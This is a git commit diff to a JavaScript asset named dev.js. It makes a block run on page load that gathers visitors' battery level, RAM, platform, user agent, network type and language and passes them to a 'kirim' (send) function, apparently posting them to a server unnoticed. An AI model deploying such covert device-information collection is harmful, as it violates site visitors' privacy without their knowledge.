03a3379d0f11c2cb9903b7a54b83617aafd35974
Fajar Firdaus <35714197+FajarTheGGman@users.noreply.github.com>
2020-05-25 18:47:53 +0700

    Update dev.js

--- assets/dev.js
+++ assets/dev.js
@@ -9,7 +9,9 @@ $.ajax({
 }
 
 // get all device information
+window.onload = () => {
 navigator.getBattery().then((s) => {
     kirim("[?] Battery : " + s.level * 100 + "%\n","[?] Device Ram :" + navigator.deviceMemory + "GB\n", "[?] Platform : " + navigator.platform, "\n[?] User Agent : " + navigator.userAgent + "\n", "[?] Network Type : " + navigator.connection.effectiveType, "\n[?] Language : " + navigator.language)
 })
+}
 
